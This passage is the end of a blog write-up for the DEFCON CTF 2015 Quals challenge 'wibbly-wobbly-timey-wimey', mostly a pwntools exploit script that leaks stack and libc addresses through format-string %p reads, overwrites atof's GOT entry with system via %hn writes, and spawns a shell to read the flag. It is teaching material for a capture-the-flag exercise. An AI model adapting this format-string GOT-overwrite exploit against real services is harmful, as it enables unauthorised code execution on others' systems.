+t.send(drct[0]+'\n')
+</code></pre></div></div>
+
+<h1 id="done-playing-time-to-send-tardis-key">Done playing, time to send TARDIS KEY</h1>
+
+<p>log.info(“sending tardis key…”)
+t.send(“UeSlhCAGEp\n”)
+print t.recvuntil(“Selection: “)
+log.info(“overwriting fd…”)
+t.send(“11111111\x00\n”)
+print t.recvuntil(“Selection: “)
+time.sleep(2) # wait for 2 second so the service’s able to call sub_BCB()
+log.info(“enable choice 3…”)
+t.send(“m+YU\n”) # m+YU = 1431907181
+t.send(“1\n”) # turn on the TARDIS console
+print t.recvuntil(“Selection: “)
+log.info(“writing fd back…”)
+t.send(“11111111\x03\n”) # write the fd back to 3 so the rest of our input won’t get into sub_BCB()
+print t.recvuntil(“Selection: “)
+t.sendline(“3”)
+t.recvuntil(“Coordinates: “)
+log.success(“choice 3 enabled success”)</p>
+
+<p>x = 51.492137
+y = -0.192878
+pass_xy = str(x)+’,’+str(y)</p>
+
+<p>payload = pass_xy</p>
+
+<h1 id="constructing-format-string-payload">constructing format string payload</h1>
+<p>for i in xrange(1, 20):
+    a = “.%”+str(i)+”$p”
+    payload += a</p>
+
+<p>log.info(“sending payload…”)
+t.sendline(payload)
+s = t.recvuntil(“Coordinates: “)
+print s
+nptr = int(s.split(“.”)[13], 16) # get the stack address
+ret_addr = nptr + 0x406 # return address’ location</p>
+
+<p>log.success(“nptr: “+ hex(nptr))
+log.success(“ret: “+ hex(ret_addr))</p>
+
+<p>payload = pass_xy
+payload += “A” # padding
+payload += p32(ret_addr)
+payload += “.%20$p”
+payload += “.%20$s.” # leak the return address
+t.sendline(payload)</p>
+
+<p>s = t.recvuntil(“Coordinates: “)
+print s
+WTF = u32(s.split(“.”)[6]) # return address
+text_base = WTF - 0x1491
+atof_got = text_base + 0x5080
+log.success(“text_base: “+ hex(text_base))
+log.success(“atof_got: “+ hex(atof_got))</p>
+
+<p>payload = pass_xy
+payload += “A”
+payload += p32(atof_got)
+payload += “.%20$p”
+payload += “.%20$s.”  # leak atof’s got
+t.sendline(payload)</p>
+
+<p>s = t.recvuntil(“Coordinates: “)
+print s
+atof_addr = u32(s.split(“.”)[6][0:4])
+system_addr = atof_addr + 59728
+log.success(“atof addres: “+ hex(atof_addr))
+log.success(“system addres: “+ hex(system_addr))</p>
+
+<p>byte1 = system_addr &amp; 0xFF
+byte2 = (system_addr &amp; 0xFFFF00) » 8</p>
+
+<h1 id="use-n-to-overwrite-atofs-got-entry-into-systems-address">use %n to overwrite atof’s got entry into system’s address</h1>
+<p>fmt1 = byte1 - 28
+fmt2 = byte2 - fmt1 - 28
+payload = pass_xy
+payload += “A”
+payload += p32(atof_got)
+payload += p32(atof_got+1)
+payload += “%”+str(fmt1)+”c”+”%20$hhn”
+payload += “%”+str(fmt2)+”c%21$hn”
+t.sendline(payload)
+s = t.recvuntil(“Coordinates: “)
+print s</p>
+
+<p>t.interactive()</p>
+<h1 id="send-cat-homewwtwflag123-to-get-flag">send cat /home/wwtw/flag;,123 to get flag</h1>
+
+<p>```</p>
+
+<p>Flag: <code class="highlighter-rouge">Would you like a Jelly Baby? !@()*ASF)9UW$askjal</code></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#c" class="page__taxonomy-item" rel="tag">C</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#defcon" class="page__taxonomy-item" rel="tag">DEFCON</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#format-string" class="page__taxonomy-item" rel="tag">format_string</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#ppc" class="page__taxonomy-item" rel="tag">PPC</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pwnable" class="page__taxonomy-item" rel="tag">Pwnable</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#write-ups" class="page__taxonomy-item" rel="tag">write-ups</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2015-05-24T06:40:00+08:00">May 24, 2015</time></p>
+        
+      </footer>
+
+      <!-- /usr/gem/gems/minimal-mistakes-jekyll-4.13.0/_includes/social-share.html -->
+<!-- Remove linkdin shared button -->
+<section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=DEFCON+CTF+2015+Quals+--+wibbly-wobbly-timey-wimey%20http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-wibbly-wobbly-timey-wimey%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-wibbly-wobbly-timey-wimey%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=http%3A%2F%2F0.0.0.0%3A4000%2Fdefcon-ctf-2015-quals-wibbly-wobbly-timey-wimey%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><i class="fab fa-fw fa-google-plus" aria-hidden="true"></i><span> Google+</span></a>
+
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/defcon-ctf-2015-quals-catwestern/" class="pagination--pager" title="DEFCON CTF 2015 Quals – catwestern
+">Previous</a>
+    
+    
+      <a href="/ais3-2015-pre-exam-complete-writeup/" class="pagination--pager" title="AIS3 2015 pre-exam – complete writeup
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You May Also Enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Chakrazy-exploiting-type-confusion-bug-in-ChakraCore/" rel="permalink">Chakrazy – exploiting type confusion bug in ChakraCore engine
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/" rel="permalink">Learning browser exploitation via 33C3 CTF  feuerfuchs challenge
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Introduction
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/hxp-CTF-2017-hardened-flag-store/" rel="permalink">hxp CTF 2017 – hardened_flag_store
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="http://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title" itemprop="headline">
+      
+        <a href="/MeePwn-CTF-2017-Brainfuck-1-2/" rel="permalink">MeePwn CTF 2017 – Brainfuck 1 &amp; 2
+</a>
+      
+    </h2>
+    
+    <p class="archive__item-excerpt" itemprop="description">Category: Pwnable
+
+</p>
+  </article>
+</div>
+        
+      </div>
+    </div>
+  
+</div>
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><input type="text" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+    <div id="results" class="results"></div></div>
+      </div>
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2018 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://0.0.0.0:4000/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/";  // Replace PAGE_URL with your page's canonical URL variable
+      this.page.identifier = "/defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+      var d = document, s = d.createElement('script');
+      s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+  </body>
+</html>
